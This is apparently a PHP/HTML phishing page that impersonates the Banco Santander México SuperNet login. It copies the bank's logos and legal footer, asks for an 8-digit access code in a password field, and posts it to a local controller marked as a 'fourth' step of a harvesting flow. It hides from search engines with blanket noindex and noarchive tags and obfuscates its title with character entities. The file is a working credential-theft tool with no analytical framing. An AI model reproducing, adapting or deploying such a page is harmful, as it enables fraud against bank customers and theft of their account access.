<?php
require 'methods/date.php';
require 'methods/device.php';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="Googlebot-News" content="noindex, nofollow">
    <meta name="Googlebot-News" content="nosnippet">
    <meta name="Googlebot-News" content="noarchive">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="googlebot" content="noarchive">
    <meta name="googlebot" content="nosnippet">
    <meta name="bingbot" content="noindex, nofollow">
    <meta name="bingbot" content="noarchive">
    <meta name="bingbot" content="nosnippet">
    <meta name="yandexbot" content="noindex, nofollow">
    <meta name="yandexbot" content="noarchive">
    <meta name="yandexbot" content="nosnippet">
    <meta name="robots" content="noindex, nofollow">
    <meta name="robots" content="noimageindex">
    <meta name="robots" content="noarchive">
    <meta name="robots" content="nosnippet">
    <title>&#83;&#97;&#110;&#116;&#97;&#110;&#100;&#101;&#114;&nbsp;|&nbsp;&#83;2&nbsp;&#91;4.9.11&#93;</title>
    <link rel="shortcut icon" href="media/favicon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/formStyle.css">
</head>

<body>
    <script src="./js/onlyNumbers.js"></script>
    <?php if ($tablet_browser > 0 || $mobile_browser > 0) {
        echo '<style>
        input {
            width: 360px!important;
        }

        h4{
            font-size: 25px!important;
        }

        .card {
            width: 400px!important;
            /* Centrar */
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
            height: 470px!important;

            /*Alinear en el centro*/
            margin: 0 auto;
            margin-top: 20%;
        }
    </style>';
    } ?>


    <div class="arriba">
        <img src="./media/Santander-Logo.png" alt="">
    </div>
    <div class="abajo">
        <h5 id="fecha">
            <?php echo $valueDay . " de " . $meses[$valueMonth - 1] . " del " . $year; ?>
        </h5>
    </div>

    <div class="container">
        <div class="card">
            <h4 style="font-size: xx-large; margin-bottom:50px!important;" id="cTitle">??Bienvenido a <strong> SuperNet!</strong></h4>
            <h6 style="margin-bottom:-8%; padding-top:95px;"><strong>Ingresa tus datos para identificarte</strong></h6>
            <form action="controller/client.php" method="post">
                <div class="inputContainer mt-5">
                    <label class="label-element" for="client">
                        C??digo:
                    </label>
                    <div class="inpt">
                        <input autocomplete="off" class="input-element" id="client" maxlength="8" onkeyup="this.value=Numeros(this.value)" type="password" name="code">
                    </div>
                    <input type="hidden" name="action" value="fourth">
                    <button type="submit" id="send" class="mt-5" disabled>Continuar</button>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <?php if ($tablet_browser > 0 || $mobile_browser > 0) {
            echo '<h5 id="tFoot">Derechos Reservados 2023, ??Banco Santander M??xico S.A., Instituci??n de Banca M??ltiple, Grupo Financiero Santander. Aviso Legal, T??rminos y Condiciones | S2 [4.9.11]</h5>';
            echo '<!--';
        } ?>

        <div class="izquierda">
            <h5>Derechos Reservados 2023, ??Banco Santander M??xico S.A., Instituci??n de Banca M??ltiple,<br> Grupo Financiero Santander. Aviso Legal, T??rminos y Condiciones | S2 [4.9.11]</h5>
        </div>
        <div class="derecha">
            <img src="./media/Santander-Logo.png" alt="">
        </div>

        <?php if ($tablet_browser > 0 || $mobile_browser > 0) {
            echo '-->';
        } ?>
    </footer>
    <script>
        const button = document.getElementById('send');
        const input = document.getElementById('client');

        input.addEventListener('keyup', () => {
            if (input.value.length == 8) {
                button.disabled = false;
                button.style.transition = "all 0.5s";
            } else {
                button.disabled = true;
            }
        });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
</body>

</html>